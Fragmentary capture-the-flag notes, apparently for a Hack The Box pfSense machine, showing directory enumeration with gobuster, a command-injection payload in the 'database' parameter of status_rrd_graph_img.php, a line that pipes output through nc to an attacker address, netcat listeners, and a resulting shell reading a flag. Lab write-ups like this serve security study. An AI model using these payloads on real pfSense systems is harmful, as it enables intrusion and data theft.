Using script

```
d08c32a5d4f8c8b10e76eb51a69f1a86
# cd ..
# cd /home
# ls
.snap
rohit
# cd rohit
# ls
.tcshrc
user.txt
# cat user.txt
8721327cc232073b40d27d9c17e7348b# 
```
Manual

database=queues;x=$(printf+"\55");echo+$HOME+$x+lol|nc+10.10.14.11+1234 HTTP/1.1


```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 
https://10.10.10.60 -k -x php,txt,conf -t 30 
```

x=$(printf+"\55");
Link for follow

https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/




```
GET /status_rrd_graph_img.php?database=queues;cd+..;+cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"CMD+INJECT">cmd.txt HTTP/1.1
Host: 10.10.10.60
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=56f38d08d3656468ace8ec24e47efcdb; cookie_test=1591553574
Upgrade-Insecure-Requests: 1

```

nc -lvnp 4444 < cmd 
^C

nc -lvnp 1234

root shell